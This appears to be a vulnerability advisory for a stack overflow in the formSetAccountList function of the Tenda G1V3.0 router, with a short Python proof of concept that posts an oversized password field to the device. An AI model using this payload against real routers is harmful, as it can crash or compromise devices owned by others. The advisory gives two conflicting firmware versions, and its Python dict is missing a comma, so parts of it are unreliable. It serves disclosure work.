# Tenda G1V3.0 formSetAccountList
### Overview
vendor: Tenda Enterprise-level wired router

product: G1V3.0 

version: V16.01.0.13(3742)

type: Stack Overflow
### Vulnerability Description
Tenda G1V3.0 Enterprise-level wired router V16.01.7.7(2631) were discovered to contain a stack overflow in the formSetAccountList function.
### Vulnerability details
In function formSetAccountList line 31、35, it reads in a user-provided parameter `password`, and the variable `String` is passed to the `SimpleEncryptToBase64` function without any length check, which may overflow the stack-based buffer `v17`. As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution.

![](images/w18e-3-2.png)

### POC
```python
import requests
ip = '192.168.0.1'
url = f'http://{ip}/goform/setModules'
payload = {
    "userType": "admin"
    "password": 'a' * 1000
}

res = requests.post(url=url, data=payload)
print(res.content)
```
